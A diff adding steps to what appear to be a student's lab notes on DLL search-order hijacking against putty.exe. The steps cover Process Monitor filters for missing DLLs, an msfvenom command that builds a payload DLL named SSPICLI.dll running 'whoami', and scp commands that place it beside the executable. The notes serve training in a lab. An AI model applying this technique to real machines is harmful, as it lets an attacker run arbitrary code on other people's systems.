@@ -461,3 +461,25 @@ ex: words of interest:
 
 - (youll find an exe and then youll use your sysinternals, if it isnt on target, scp onto your home linux box)
 
+- (run procmon)
+** procmon acceptula**
+
+- (open file in procmon and enter the filters)
+Process Name contains putty.exe
+
+Path contains .dll
+
+Result is NAME NOT FOUND
+
+- (identify .dll to alter)
+
+- (** got to linops**)
+**msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll**
+
+- (once dll is created, SCP to your target machine)
+(from windows)
+** scp student@linopip:/home/student/SSPICLI.dll C:\Users\student\documents\putty**
+
+- (from windows, you need to put the dll with the exe so it can properly run )
+  
+- (run exe over again, file should display on desktop, with the cmd return in it)
